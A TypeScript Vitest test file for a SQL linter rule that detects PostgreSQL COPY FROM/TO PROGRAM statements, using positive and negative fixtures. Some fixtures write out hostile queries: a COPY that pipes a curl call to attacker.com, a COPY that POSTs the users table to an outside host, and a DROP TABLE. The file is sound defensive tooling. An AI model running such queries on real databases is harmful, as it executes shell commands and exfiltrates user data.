import { beforeAll, describe, expect, it } from 'vitest';

  import { analyze, init } from '../src/index.js';
  import { parseQuery } from '../src/parser.js';
  import { SQL_016 } from '../src/rules/sql-016-copy-program.js';

  // SQL-016 — COPY FROM/TO PROGRAM.
  //
  // Phase 1 scaffolding tests:
  //   - Positive fixtures are `it.skip`'d. They become live in Phase 2
  //     when the detection logic ships.
  //   - Negative fixtures run live; they assert the placeholder returns
  //     null on shapes the rule must not flag once implemented.
  //   - The multi-statement composition fixture has two halves: the
  //     "new rule fires" half is skipped; the "existing rule still
  //     fires" half runs live in Phase 1 (it proves we have not
  //     regressed an existing rule by adding the new one).

  beforeAll(async () => {
    await init();
  });

  function fire(sql: string) {
    const r = parseQuery(sql);
    expect(r.error).toBeUndefined();
    return SQL_016(r.ast);
  }

  describe('SQL-016 — positive fixtures (Phase 2 unskips)', () => {
    it('fires on COPY ... FROM PROGRAM', () => {
      const c = fire("COPY users FROM PROGRAM 'curl http://attacker.com/data'");
      expect(c?.code).toBe('SQL-016');
      expect(c?.severity).toBe('block');
      expect(c?.confidence).toBe(99);
    });

  it('fires on COPY (subquery) TO PROGRAM', () => {
      const c = fire("COPY (SELECT * FROM users) TO PROGRAM 'curl -X POST https://e.com'");
      expect(c?.code).toBe('SQL-016');
      expect(c?.severity).toBe('block');
      expect(c?.confidence).toBe(99);
    });

  it('fires on lowercase copy from program', () => {
      const c = fire("copy users from program 'cmd'");
      expect(c?.code).toBe('SQL-016');
      expect(c?.severity).toBe('block');
      expect(c?.confidence).toBe(99);
    });
  });

  describe('SQL-016 — negative fixtures (must not fire)', () => {
    it('does not fire on COPY FROM file path', () => {
      expect(fire("COPY users FROM '/tmp/users.csv'")).toBeNull();
    });

  it('does not fire on COPY TO STDOUT', () => {
      expect(fire("COPY (SELECT 1) TO STDOUT")).toBeNull();
    });

  it('does not fire on string literal containing \'COPY FROM PROGRAM\'', () => {
      expect(fire("INSERT INTO logs (msg) VALUES ('COPY FROM PROGRAM')")).toBeNull();
    });
  });

  describe('SQL-016 — multi-statement composition with SQL-013', () => {
    it('the new rule fires alongside SQL-013', () => {
      const result = analyze("DROP TABLE staging; COPY users FROM PROGRAM 'curl x';");
      const codes = result.catches.map((c) => c.code);
      expect(codes).toContain('SQL-016');
      expect(codes).toContain('SQL-013');
    });

    it('SQL-013 still fires when the placeholder is in registry', () => {
      const result = analyze("DROP TABLE staging; COPY users FROM PROGRAM 'curl x';");
      const codes = result.catches.map((c) => c.code);
      expect(codes).toContain('SQL-013');
    });
  });
  